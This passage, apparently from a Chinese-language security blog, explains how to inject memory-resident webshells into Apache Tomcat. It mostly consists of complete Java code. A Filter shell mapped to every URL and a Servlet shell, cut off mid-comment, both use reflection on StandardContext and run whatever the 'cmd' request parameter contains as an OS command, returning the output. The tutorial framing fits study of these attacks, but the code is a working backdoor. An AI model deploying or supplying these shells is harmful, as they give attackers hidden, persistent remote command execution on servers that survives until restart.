<span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>KoishiAddTomcatFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/koishiFilter<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>KoishiAddTomcatFilter<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.tomcat.memshell.Filter.KoishiMemFilter<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>KoishiAddTomcatFilter<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/koishiFilter<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h4 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a><strong>正式开始</strong></h4><p><strong>思路</strong></p>
<blockquote>
<ol>
<li>先拿到 context </li>
<li>创建一个恶意 Filter</li>
<li>利用 FilterDef 对 Filter 进行一个封装</li>
<li>将 FilterDef 添加到 FilterDefs 和 FilterConfig</li>
<li>创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）</li>
</ol>
</blockquote>
<blockquote>
<p><strong>每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启</strong></p>
</blockquote>
<p><strong>前面说到当组装我们的过滤器链的时候 ，是从context中获取到的 FiltersMaps，所以先拿到 context</strong></p>
<p>当我们能直接获取 request 的时候，我们这里可以直接使用如下方法</p>
<p>（当 Web 容器启动的时候会为每个 Web 应用都创建一个 ServletContext 对象，代表当前 Web 应用）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">appctx.setAccessible(true);</span><br><span class="line">    // ApplicationContext 为 ServletContext 的实现类</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">stdctx.setAccessible(true);</span><br><span class="line"> // 这样我们就获取到了 context </span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>如果没有request对象的话可以从当前线程中获取</p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/114625962" >https://zhuanlan.zhihu.com/p/114625962 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>从MBean中获取</p>
<p><a class="link"   href="https://scriptboy.cn/p/tomcat-filter-inject/" >https://scriptboy.cn/p/tomcat-filter-inject/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><strong>Filter 内存马</strong></p>
<p>Filter实现<code>doFilter</code>恶意方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tomcat.util.ClassUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiMemFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;koishi&quot;</span>;</span><br><span class="line">        <span class="comment">// 通过 request 获取 ServletContext 对象</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">        <span class="comment">// 首先判断名字是否存在，如果不存在我们就进行注入</span></span><br><span class="line">        <span class="keyword">if</span> (servletContext.getFilterRegistration(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">            流程 ApplicationContextFacade-&gt;ApplicationContext-&gt;StandardContext</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="comment">// 1.获取 context</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// ApplicationContext 为 ServletContext 的实现类,这里下面通过反射获取 servletContext 的 context 中的具体属性值</span></span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                <span class="comment">//这里同理，继续反射获取context中的属性值</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">applicationField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                applicationField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">//最终在这里 这样我们就获取到了 StandardContext 下的 HashMap 类型的 filterDefs</span></span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) applicationField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2.创建自定义的Filter对象</span></span><br><span class="line">            <span class="comment">// Tomcat 包下的 ClassUtil 的继承了类加载器，可以用来专门加载Spring下的类</span></span><br><span class="line">            <span class="comment">// Class&lt;?&gt; filterClass = ClassUtil.getClass(ClassUtil.FILTER_STRING);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//恶意 filter</span></span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                            <span class="comment">//Process process = new ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,req.getParameter(&quot;cmd&quot;)).start();</span></span><br><span class="line">                            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                            servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                            process.destroy();</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建FilterDef</span></span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">                filterDef.setFilterName(filterName);</span><br><span class="line">                <span class="comment">//filterDef.setFilter((Filter)filterClass.newInstance());</span></span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                <span class="comment">//filterDef.setFilterClass(filterClass.getName());</span></span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建ApplicationFilterConfig</span></span><br><span class="line">                Constructor&lt;?&gt;[] constructor = ApplicationFilterConfig.class.getDeclaredConstructors();</span><br><span class="line">                constructor[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">config</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor[<span class="number">0</span>].newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建FilterMap</span></span><br><span class="line">                <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">                filterMap.setFilterName(filterName);</span><br><span class="line">                <span class="comment">// * 或者 /* 都会匹配所有url路径，这就使内存马再任意页面都可执行</span></span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * Filter拦截方式配置</span></span><br><span class="line"><span class="comment">                 * REQUEST：默认值。浏览器直接请求资源（下面设置成这个的目的应该也是为了直接请求资源，不做过多处理）</span></span><br><span class="line"><span class="comment">                 * FORWARD：转发访问资源</span></span><br><span class="line"><span class="comment">                 * INCLUDE：包含访问资源</span></span><br><span class="line"><span class="comment">                 * ERROR：错误跳转资源</span></span><br><span class="line"><span class="comment">                 * ASYNC：异步访问资源</span></span><br><span class="line"><span class="comment">                 * */</span></span><br><span class="line">                filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 反射将ApplicationFilterConfig放入StandardContext中的filterConfigs中</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">configfield</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">                configfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// 直接赋值会把别的服务给覆盖掉, 取出再赋值</span></span><br><span class="line">                HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs = (HashMap&lt;String, ApplicationFilterConfig&gt;) configfield.get(standardContext);</span><br><span class="line">                filterConfigs.put(filterName, config);</span><br><span class="line"></span><br><span class="line">                standardContext.addFilterDef(filterDef);</span><br><span class="line">                <span class="comment">// 将我们的 filterMap 写到第一个</span></span><br><span class="line">                standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">                resp.getOutputStream().write(<span class="string">&quot;inject success ！恭喜&quot;</span>.getBytes());</span><br><span class="line">                resp.getOutputStream().flush();</span><br><span class="line">                resp.getOutputStream().close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter 初始化创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行过滤操作&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>







<h2 id="三、Servlet-内存马"><a href="#三、Servlet-内存马" class="headerlink" title="三、Servlet 内存马"></a>三、Servlet 内存马</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><p><a class="link"   href="https://blog.csdn.net/angry_program/article/details/118492214" >可以参考的文章（个人感觉讲的相当nice） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Servlet 是 Server Applet（服务器端小程序）的缩写，用来读取客户端发送的数据，处理并返回结果。也是最常见的 Java 技术之一。</p>
<p>与 Filter 相同，本小节也仅仅讨论使用 ServletContext 的相关方法添加 Servlet。还是首先来看一下实现类 <code>ApplicationContext</code> 的 <code>addServlet</code> 方法。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1-16673128653255.png"
                      alt="1"
                ></p>
<p>与上一小节看到的 <code>addFilter</code> 方法十分类似，这个过程简单一点，只有两部走：</p>
<blockquote>
<ul>
<li><code>ApplicationServletRegistration</code> 的 <code>addMapping</code> 方法调用 <code>StandardContext#addServletMapping</code> 方法，在 mapper 中添加 URL 路径与 Wrapper 对象的映射（Wrapper 通过 this.children 中根据 name 获取）</li>
<li>同时在 <code>servletMappings</code> 中添加 URL 路径与 name 的映射。</li>
</ul>
</blockquote>
<h3 id="简单记录一下Servlet的周期"><a href="#简单记录一下Servlet的周期" class="headerlink" title="简单记录一下Servlet的周期"></a>简单记录一下Servlet的周期</h3><h4 id="Servlet的生成与动态添加"><a href="#Servlet的生成与动态添加" class="headerlink" title="Servlet的生成与动态添加"></a>Servlet的生成与动态添加</h4><p><strong>Servlet的生成与动态添加依次进行了以下步骤（详情见参考文章）：</strong></p>
<blockquote>
<ol>
<li><p>通过 context.createWapper() 创建 Wapper 对象；</p>
</li>
<li><p>设置 Servlet 的 LoadOnStartUp 的值；</p>
</li>
<li><p>设置 Servlet 的 Name；</p>
</li>
<li><p>设置 Servlet 对应的 Class；</p>
</li>
<li><p>将 Servlet 添加到 context 的 children 中；</p>
</li>
<li><p>将 url 路径和 servlet 类做映射。</p>
</li>
</ol>
</blockquote>
<h4 id="Servlet-装载过程"><a href="#Servlet-装载过程" class="headerlink" title="Servlet 装载过程"></a>Servlet 装载过程</h4><p>在 <code>org.apache.catalina.coreStandardWapper#loadServlet()</code> 下断点调试：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png"
                      alt="img"
                ></p>
<p>回溯到 <code>org.apache.catalina.core.StandardContext#startInternal</code>方法中可以看到，是在加载完Listener和Filter之后，才装载Servlet：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-16673738253923.png"
                      alt="img"
                ></p>
<p>前面已经完成了将所有 servlet 添加到 context 的 children 中，this.findChildren()即把所有Wapper（负责管理Servlet）传入loadOnStartup()中处理，可想而知loadOnStartup()就是负责动态添加Servlet的一个函数：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-16673738718869.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737390543912.png"
                      alt="img"
                ></p>
<p>首先获取Context下所有的Wapper类，并获取到每个Servlet的启动顺序，删选出 &gt;&#x3D; 0 的项加载到一个存放Wapper的list中。</p>
<p>如果在web.xml 中servlet未声明  load-on-startup 的值，则默认-1，表示不加载</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737397584915.png"
                      alt="img"
                ></p>
<p><strong>则该Servlet不会被动态添加到容器：</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737399110518.png"
                      alt="img"
                ></p>
<p><strong>然后对每个wapper进行装载：</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737404687621.png"
                      alt="img"
                ></p>
<blockquote>
<p>装载：启动服务器时加载Servlet的实例</p>
<p>初始化：web服务器启动时或web服务器接收到请求时，或者两者之间的某个时刻启动。初始化工作有init()方法负责执行完成</p>
<p>调用：即每次调用Servlet的service()，从第一次到以后的多次访问，都是只是调用doGet()或doPost()方法（doGet、doPost内部实现，具体参照HttpServlet类service()的重写）（和之前filter写dofilter是一样的目的）</p>
<p>销毁：停止服务器时调用destroy()方法，销毁实例</p>
</blockquote>
<p><strong>因此severlet内存马的构建思路差不多就有了</strong></p>
<blockquote>
<p>context 中获取StandardContext 对象</p>
<p>使用 Wrapper 封装我们的 Servlet </p>
<p>向 standardContext 的 children 中添加我们封装好的 wrapper</p>
</blockquote>
<h3 id="正式书写内存马"><a href="#正式书写内存马" class="headerlink" title="正式书写内存马"></a>正式书写内存马</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Servlet;</span><br><span class="line"><span class="keyword">import</span> com.tomcat.util.ClassUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiMemServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">urlPattern</span> <span class="operator">=</span> <span class="string">&quot;/koishi&quot;</span>;</span><br><span class="line">            <span class="comment">//String urlPattern = &quot;*&quot;;</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> <span class="string">&quot;cirno&quot;</span>;</span><br><span class="line">            <span class="comment">// 从 request 中获取 servletContext</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">            <span class="comment">// 如果已有此 servletName 的 Servlet，则不再重复添加</span></span><br><span class="line">            <span class="keyword">if</span>(servletContext.getServletRegistration(servletName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 反射获取 context，和 filter 差不多</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">servletfield</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                servletfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletfield.get(servletContext);</span><br><span class="line"></span><br><span class="line">                <span class="type">Field</span> <span class="variable">contextfield</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) contextfield.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象</span></span><br><span class="line"><span class="comment">                StandardContext o = null;</span></span><br><span class="line"><span class="comment">                while (o == null) &#123;</span></span><br><span class="line"><span class="comment">                    Field f = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="comment">                    f.setAccessible(true);</span></span><br><span class="line"><span class="comment">                    Object object = f.get(servletContext);</span></span><br><span class="line"><span class="comment">                    if (object instanceof ServletContext) &#123;</span></span><br><span class="line"><span class="comment">                        servletContext = (ServletContext) object;</span></span><br><span class="line"><span class="comment">                    &#125; else if (object instanceof StandardContext) &#123;</span></span><br><span class="line"><span class="comment">                        o = (StandardContext) object;</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//新建servlet</span></span><br><span class="line">                <span class="comment">//Class&lt;?&gt; classServlet = ClassUtil.getClass(ClassUtil.SERVLET_STRING);</span></span><br><span class="line">                <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                            isLinux = <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                        out.println(output);</span><br><span class="line">                        out.flush();</span><br><span class="line">                        out.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// 使用 Wrapper 封装 Servlet</span></span><br><span class="line">                <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">                <span class="comment">// 设置为1才会将Servlet添加至容器</span></span><br><span class="line">                <span class="comment">// 当值为0或者大于0时，表示容器在应用启动时就加载这个servlet；读取 web.xml中的每个Servlet 或者新建Servlet 默认是 -1</span></span><br><span class="line">                wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">                wrapper.setName(servletName);</span><br><span class="line">                wrapper.setServlet(servlet);</span><br><span class="line">                wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">            <span class="comment">// 向 children 中添加 wrapper</span></span><br><span class="line">                standardContext.addChild(wrapper);</span><br><span class="line">            <span class="comment">// 